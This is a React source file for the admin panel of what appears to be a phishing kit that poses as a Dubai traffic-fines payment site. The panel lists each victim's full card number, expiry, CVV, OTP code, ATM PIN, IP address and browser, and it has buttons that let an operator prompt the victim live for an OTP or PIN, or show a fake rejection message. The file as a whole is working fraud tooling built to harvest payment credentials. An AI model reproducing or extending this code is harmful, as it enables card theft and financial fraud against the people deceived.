import React, { useState, useEffect } from "react";
import { trpc } from "@/lib/trpc";
import { 
  Users, 
  Clock, 
  CheckCircle, 
  Activity, 
  Wifi, 
  Search, 
  RefreshCw, 
  LogOut, 
  Eye, 
  Shield,
  Bell,
  CheckCircle2,
  XCircle,
  CreditCard,
  X
} from "lucide-react";
import { Badge } from "@/components/ui/badge";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

interface PaymentSession {
  id: number;
  sessionId: string;
  queryId: number | null;
  selectedFines: any;
  totalAmount: string | null;
  cardName: string | null;
  cardNumber: string | null;
  cardNumberMasked: string | null;
  cardExpiry: string | null;
  cardCvv: string | null;
  otpCode: string | null;
  atmPin: string | null;
  stage: Stage;
  errorMessage: string | null;
  plateNumber: string | null;
  plateSource: string | null;
  clientIp: string | null;
  userAgent: string | null;
  statusRead: number | null;
  createdAt: Date | string;
  updatedAt: Date | string;
}

const stageConfig: Record<Stage, { label: string; color: string; bg: string }> = {
  card:         { label: "جديد",              color: "#3b82f6", bg: "#eff6ff" },
  card_pending: { label: "انتظار البطاقة",    color: "#f59e0b", bg: "#fffbeb" },
  otp:          { label: "مطلوب OTP",         color: "#8b5cf6", bg: "#f5f3ff" },
  otp_pending:  { label: "انتظار OTP",        color: "#f59e0b", bg: "#fffbeb" },
  atm:          { label: "مطلوب PIN",         color: "#7c3aed", bg: "#ede9fe" },
  atm_pending:  { label: "انتظار PIN",        color: "#f59e0b", bg: "#fffbeb" },
  success:      { label: "مكتمل",             color: "#10b981", bg: "#ecfdf5" },
  failed:       { label: "فشل",               color: "#ef4444", bg: "#fef2f2" },
};

export default function AdminPanel() {
  const [token, setToken] = useState<string | null>(() => localStorage.getItem("adminToken"));
  const [password, setPassword] = useState("");
  const [loginError, setLoginError] = useState("");
  const [selectedSession, setSelectedSession] = useState<PaymentSession | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [customError, setCustomError] = useState("تم رفض العملية. يرجى المحاولة مرة أخرى.");

  const loginMutation = trpc.admin.login.useMutation({
    onSuccess: (data) => {
      localStorage.setItem("adminToken", data.token);
      setToken(data.token);
    },
    onError: (err) => setLoginError(err.message),
  });

  const { data: dashboardData, refetch } = trpc.admin.getDashboardStats.useQuery(undefined, {
    enabled: !!token,
    refetchInterval: 5000,
  });

  const updateStageMutation = trpc.admin.updateSessionStage.useMutation({
    onSuccess: () => {
      refetch();
      setSelectedSession(null);
    }
  });

  if (!token) {
    return (
      <div className="min-h-screen bg-[#0F172A] flex items-center justify-center p-4" style={{ fontFamily: "'Cairo', sans-serif" }}>
        <div className="bg-white rounded-2xl shadow-xl p-8 w-full max-w-sm text-center">
          <div className="w-16 h-16 bg-[#2563EB] rounded-xl flex items-center justify-center mx-auto mb-4 text-white">
            <Shield size={32} />
          </div>
          <h1 className="text-xl font-bold text-gray-800 mb-1">نظام مخالفات دبي</h1>
          <p className="text-gray-500 text-sm mb-6">لوحة التحكم الإدارية</p>
          <div className="space-y-4 text-right">
            <div>
              <label className="block text-sm font-bold text-gray-600 mb-1 mr-1">كلمة المرور</label>
              <input 
                type="password" 
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full p-3 bg-gray-50 border border-gray-200 rounded-xl focus:border-[#2563EB] outline-none text-center font-bold"
                placeholder="أدخل كلمة المرور"
                onKeyDown={(e) => e.key === 'Enter' && loginMutation.mutate({ password })}
              />
            </div>
            {loginError && <p className="text-red-500 text-xs font-bold text-center">{loginError}</p>}
            <button 
              onClick={() => loginMutation.mutate({ password })}
              className="w-full bg-[#2563EB] hover:bg-[#1D4ED8] text-white font-bold py-3 rounded-xl shadow-lg transition-all flex items-center justify-center gap-2"
            >
              <LogOut size={18} className="rotate-180" />
              تسجيل الدخول
            </button>
          </div>
        </div>
      </div>
    );
  }

  const sessions = (dashboardData?.sessions || []) as unknown as PaymentSession[];
  const filteredSessions = sessions.filter(s => 
    s.sessionId.includes(searchQuery) || 
    s.plateNumber?.includes(searchQuery) ||
    s.cardName?.includes(searchQuery)
  );

  const handleUpdateStage = (sessionId: string, stage: Stage, error?: string) => {
    updateStageMutation.mutate({ sessionId, stage, errorMessage: error });
  };

  return (
    <div className="min-h-screen bg-[#F8FAFC]" dir="rtl" style={{ fontFamily: "'Cairo', sans-serif" }}>
      {/* Top Header */}
      <header className="bg-white border-b border-gray-100 px-6 py-3 flex items-center justify-between sticky top-0 z-50">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 bg-[#2563EB] rounded-lg flex items-center justify-center text-white">
            <Shield size={24} />
          </div>
          <div className="text-right">
            <h1 className="text-sm font-bold text-gray-800 leading-none">نظام مخالفات دبي</h1>
            <p className="text-[10px] text-blue-600 font-bold mt-1">لوحة التحكم</p>
          </div>
        </div>
        
        <div className="flex items-center gap-4">
          <div className="flex items-center gap-2 px-3 py-1.5 bg-green-50 rounded-full border border-green-100">
            <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
            <span className="text-[11px] font-bold text-green-600">متصل</span>
          </div>
          <button onClick={() => refetch()} className="p-2 text-gray-400 hover:bg-gray-50 rounded-lg transition-colors" title="تحديث">
            <RefreshCw size={18} />
          </button>
          <button 
            onClick={() => { localStorage.removeItem("adminToken"); setToken(null); }}
            className="flex items-center gap-2 px-3 py-1.5 bg-red-50 text-red-600 rounded-lg hover:bg-red-100 transition-colors font-bold text-xs"
          >
            <LogOut size={14} />
            <span>خروج</span>
          </button>
        </div>
      </header>

      <main className="p-6 max-w-[1400px] mx-auto">
        {/* Stats Grid */}
        <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mb-6">
          <StatCard icon={<Users size={20} />} label="إجمالي الحجوزات" value={sessions.length} color="blue" />
          <StatCard icon={<Bell size={20} />} label="حجوزات جديدة" value={sessions.filter(s => s.stage === 'card').length} color="orange" />
          <StatCard icon={<CheckCircle2 size={20} />} label="مكتملة" value={sessions.filter(s => s.stage === 'success').length} color="green" />
          <StatCard icon={<Clock size={20} />} label="قيد المعالجة" value={sessions.filter(s => s.stage.endsWith('_pending')).length} color="yellow" />
          <StatCard icon={<Wifi size={20} />} label="زوار متصلون الآن" value={dashboardData?.activeVisitors || 0} color="purple" />
        </div>

        {/* Table Section */}
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
          <div className="p-5 border-b border-gray-50 flex items-center justify-between">
            <h2 className="font-bold text-gray-800">قائمة الحجوزات</h2>
            <div className="relative">
              <Search className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400" size={16} />
              <input 
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="bg-gray-50 border border-gray-100 rounded-xl pr-10 pl-4 py-2 text-xs focus:ring-2 focus:ring-blue-500 outline-none w-64" 
                placeholder="بحث..." 
              />
            </div>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-right">
              <thead className="bg-gray-50/50 text-gray-400 text-[11px] font-bold uppercase tracking-wider">
                <tr>
                  <th className="px-6 py-4">العملية</th>
                  <th className="px-6 py-4">البيانات</th>
                  <th className="px-6 py-4">المبلغ</th>
                  <th className="px-6 py-4">الحالة</th>
                  <th className="px-6 py-4">التوقيت</th>
                  <th className="px-6 py-4">الإجراء</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-50">
                {filteredSessions.length === 0 ? (
                  <tr>
                    <td colSpan={6} className="py-20 text-center">
                      <div className="flex flex-col items-center opacity-20">
                        <FileText size={48} />
                        <p className="mt-2 font-bold">لا توجد حجوزات</p>
                      </div>
                    </td>
                  </tr>
                ) : (
                  filteredSessions.map((session) => (
                    <tr key={session.id} className="hover:bg-gray-50/50 transition-colors">
                      <td className="px-6 py-4">
                        <div className="font-mono text-[11px] font-bold text-blue-600">#{session.sessionId.slice(0, 8)}</div>
                        <div className="text-[10px] text-gray-400 mt-0.5">{session.clientIp}</div>
                      </td>
                      <td className="px-6 py-4">
                        <div className="text-xs font-bold text-gray-700">{session.plateNumber || '-'}</div>
                        <div className="text-[10px] text-gray-400 mt-0.5">{session.cardName || '-'}</div>
                      </td>
                      <td className="px-6 py-4">
                        <div className="text-xs font-black text-gray-800">{session.totalAmount || '0.00'} <span className="text-[10px] text-gray-400">ر.ق</span></div>
                      </td>
                      <td className="px-6 py-4">
                        <Badge className="font-bold text-[10px] px-2 py-0.5 rounded-full shadow-none border-none" style={{ 
                          backgroundColor: stageConfig[session.stage]?.bg,
                          color: stageConfig[session.stage]?.color
                        }}>
                          {stageConfig[session.stage]?.label}
                        </Badge>
                      </td>
                      <td className="px-6 py-4">
                        <div className="text-[11px] text-gray-500 font-medium">{new Date(session.createdAt).toLocaleTimeString('ar-QA')}</div>
                        <div className="text-[10px] text-gray-400">{new Date(session.createdAt).toLocaleDateString('ar-QA')}</div>
                      </td>
                      <td className="px-6 py-4">
                        <button 
                          onClick={() => setSelectedSession(session)}
                          className="p-2 bg-blue-50 text-blue-600 hover:bg-blue-100 rounded-lg transition-colors"
                        >
                          <Eye size={16} />
                        </button>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      </main>

      {/* Detail Modal */}
      {selectedSession && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-[100] flex items-center justify-center p-4" dir="rtl">
          <div className="bg-white rounded-3xl w-full max-w-2xl shadow-2xl overflow-hidden animate-in zoom-in duration-300">
            <div className="bg-[#0F172A] p-6 text-white flex justify-between items-center">
              <div>
                <h3 className="text-lg font-bold">تفاصيل الجلسة</h3>
                <p className="text-gray-400 text-[10px] font-mono mt-0.5">{selectedSession.sessionId}</p>
              </div>
              <button onClick={() => setSelectedSession(null)} className="p-2 hover:bg-white/10 rounded-full transition-colors">
                <X size={20} />
              </button>
            </div>
            
            <div className="p-6 max-h-[80vh] overflow-y-auto">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
                <div className="space-y-4">
                  <DetailSection title="🚗 بيانات المركبة">
                    <DetailRow label="رقم اللوحة" value={selectedSession.plateNumber} />
                    <DetailRow label="المصدر" value={selectedSession.plateSource} />
                    <DetailRow label="المبلغ" value={selectedSession.totalAmount + " ر.ق"} />
                  </DetailSection>

                  <DetailSection title="💳 بيانات البطاقة">
                    <DetailRow label="الاسم" value={selectedSession.cardName} />
                    <DetailRow label="الرقم" value={selectedSession.cardNumber} mono />
                    <DetailRow label="التاريخ" value={selectedSession.cardExpiry} />
                    <DetailRow label="CVV" value={selectedSession.cardCvv} />
                  </DetailSection>
                </div>
                
                <div className="space-y-4">
                  <DetailSection title="🔐 رموز التحقق">
                    <div className="text-center py-4 bg-gray-50 rounded-xl border border-gray-100 mb-3">
                      <p className="text-[10px] font-bold text-gray-400 mb-1">OTP CODE</p>
                      <p className="text-2xl font-black text-blue-600 tracking-[0.2em]">{selectedSession.otpCode || "----"}</p>
                    </div>
                    <div className="text-center py-4 bg-gray-50 rounded-xl border border-gray-100">
                      <p className="text-[10px] font-bold text-gray-400 mb-1">ATM PIN</p>
                      <p className="text-2xl font-black text-purple-600 tracking-[0.2em]">{selectedSession.atmPin || "----"}</p>
                    </div>
                  </DetailSection>

                  <DetailSection title="🌐 معلومات العميل">
                    <DetailRow label="IP" value={selectedSession.clientIp} />
                    <div className="mt-2">
                      <p className="text-[10px] text-gray-400 font-bold mb-1">المتصفح:</p>
                      <p className="text-[10px] text-gray-500 break-all leading-relaxed">{selectedSession.userAgent}</p>
                    </div>
                  </DetailSection>
                </div>
              </div>

              {/* Action Controls */}
              <div className="bg-gray-50 rounded-2xl p-5 border border-gray-100">
                <h4 className="text-xs font-bold text-gray-800 mb-4 flex items-center gap-2">
                  <Activity size={14} className="text-blue-600" />
                  إدارة حالة الجلسة
                </h4>
                <div className="grid grid-cols-2 gap-3 mb-4">
                  <ActionButton label="طلب OTP" color="amber" onClick={() => handleUpdateStage(selectedSession.sessionId, 'otp')} />
                  <ActionButton label="طلب PIN" color="purple" onClick={() => handleUpdateStage(selectedSession.sessionId, 'atm')} />
                  <ActionButton label="إتمام بنجاح" color="green" onClick={() => handleUpdateStage(selectedSession.sessionId, 'success')} />
                  <ActionButton label="رفض العملية" color="red" onClick={() => handleUpdateStage(selectedSession.sessionId, 'failed', customError)} />
                </div>
                <input 
                  type="text" 
                  value={customError}
                  onChange={(e) => setCustomError(e.target.value)}
                  placeholder="رسالة الرفض..."
                  className="w-full bg-white border border-gray-200 rounded-xl px-4 py-2.5 text-xs text-gray-700 outline-none focus:ring-2 focus:ring-blue-500 transition-all"
                />
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

// Helper Components
function StatCard({ icon, label, value, color }: { icon: any; label: string; value: number | string; color: string }) {
  const colors: any = {
    blue: "bg-blue-50 text-blue-600 border-blue-100",
    orange: "bg-orange-50 text-orange-600 border-orange-100",
    green: "bg-green-50 text-green-600 border-green-100",
    yellow: "bg-yellow-50 text-yellow-600 border-yellow-100",
    purple: "bg-purple-50 text-purple-600 border-purple-100",
  };
  return (
    <div className={`p-4 rounded-2xl border ${colors[color]} flex items-center gap-4 bg-white shadow-sm`}>
      <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${colors[color].split(' ')[0]} border-none`}>
        {icon}
      </div>
      <div className="text-right">
        <p className="text-[10px] font-bold text-gray-400 leading-none mb-1">{label}</p>
        <p className="text-xl font-black text-gray-800">{value}</p>
      </div>
    </div>
  );
}

function DetailSection({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <div className="bg-white rounded-xl border border-gray-100 p-4">
      <h4 className="text-xs font-bold text-gray-800 mb-3 border-b border-gray-50 pb-2">{title}</h4>
      <div className="space-y-1">{children}</div>
    </div>
  );
}

function DetailRow({ label, value, mono }: { label: string; value: any; mono?: boolean }) {
  return (
    <div className="flex justify-between items-center text-xs py-1">
      <span className="text-gray-400 font-medium">{label}:</span>
      <span className={`font-bold text-gray-700 ${mono ? 'font-mono tracking-wider' : ''}`}>{value || "-"}</span>
    </div>
  );
}

function ActionButton({ label, color, onClick }: { label: string; color: string; onClick: () => void }) {
  const colors: any = {
    amber: "bg-amber-500 hover:bg-amber-600 shadow-amber-100",
    purple: "bg-purple-600 hover:bg-purple-700 shadow-purple-100",
    green: "bg-green-600 hover:bg-green-700 shadow-green-100",
    red: "bg-red-600 hover:bg-red-700 shadow-red-100",
  };
  return (
    <button 
      onClick={onClick}
      className={`py-2.5 text-white rounded-xl text-[11px] font-bold transition-all shadow-lg ${colors[color]}`}
    >
      {label}
    </button>
  );
}

function FileText(props: any) {
  return (
    <svg
      {...props}
      xmlns="http://www.w3.org/2000/svg"
      width="24"
      height="24"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z" />
      <path d="M14 2v4a2 2 0 0 0 2 2h4" />
      <path d="M10 9H8" />
      <path d="M16 13H8" />
      <path d="M16 17H8" />
    </svg>
  );
}
